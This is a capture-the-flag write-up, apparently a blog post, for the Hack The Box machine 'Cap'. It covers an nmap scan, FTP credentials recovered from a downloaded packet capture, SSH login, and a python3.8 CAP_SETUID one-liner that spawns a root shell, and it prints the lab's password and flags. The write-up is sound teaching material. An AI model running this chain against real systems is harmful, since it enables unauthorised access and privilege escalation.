---
layout: post
title: HTB-Cap
date: 2025-09-19
tags: [HTB]
category: [CTF-Writeups]
---

# HTB — CAP: Quick Writeup

**IP:** `10.10.10.245`  
**Difficulty:** Easy  
**Skills:** enumeration • HTTP/PCAP analysis • SSH access • local privilege escalation

> **Summary:** Ports 21/22/80 were open. A downloadable PCAP from the web app contained FTP credentials (`nathan:Buck3tH4TF0RM3!`), allowing SSH access as `nathan` to capture the user flag. Root was obtained by abusing file capabilities on `/usr/bin/python3.8`.

---

## Table of contents
1. [Recon (nmap)](#recon-nmap)  
2. [User: web & PCAP analysis](#user)  
3. [Root: privilege escalation](#root)  
4. [Flags](#flags)  

---

## Recon (nmap)

**Command used**

```bash
nmap 10.10.10.245
```

**Result**

``` bash
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http
```


---

## User

### Steps
1. Open: `http://10.10.10.245/`  
2. Click **Security Snapshot** → redirected to `/data/11`  
3. Visit `/data/0` and **Download** the PCAP 
4. Inspect the PCAP to find FTP credentials  
5. SSH in with found credentials and retrieve the user flag

### PCAP inspection (examples)
Use Wireshark:

Wireshark display filter:

```bash
ftp || ftp-data
```


**Credentials found**
- **User:** `nathan`  
- **Password:** `Buck3tH4TF0RM3!`

**SSH in**

```bash
ssh nathan@10.10.10.245
# password: Buck3tH4TF0RM3!
```

**User flag**

```bash
cat /home/nathan/user.txt
# e69b72870c3be895f01d4255f15d16cd
```

---

## Root

### Discovery
Run linPEAS to search for local privilege escalation vectors:

linPEAS showed:

```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```


This indicates `python3.8` has `CAP_SETUID`, allowing it to call `setuid(0)`.

### Exploit (one-liner)

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

**Verify root**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# 7d7c67f7ee617a0a28ec5545cb9a75e2
```

---

## Flags

- **User:** `e69b72870c3be895f01d4255f15d16cd`  
- **Root:** `7d7c67f7ee617a0a28ec5545cb9a75e2`

---

*This writeup documents a CTF box and is for educational purposes only. Do not perform these actions against systems you do not own or have permission to test.*